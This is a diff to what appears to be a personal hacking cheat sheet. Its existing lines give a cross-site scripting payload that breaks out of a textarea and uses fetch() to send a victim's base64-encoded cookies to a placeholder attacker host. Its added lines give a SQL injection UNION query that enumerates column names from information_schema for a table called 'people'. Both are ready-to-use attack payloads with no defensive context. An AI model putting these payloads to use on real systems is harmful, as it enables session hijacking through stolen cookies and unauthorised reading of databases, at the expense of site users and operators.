@@ -88,3 +88,6 @@ BIG BRAINED
 ________________________________________________________________________________
 HOW TO GET A VICTIM'S COOKIES VIA XSS:
 </textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
+________________________________________________________________________________
+If a machine is vulnerable to SQLi then one can enumerate data by typing this
+UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"
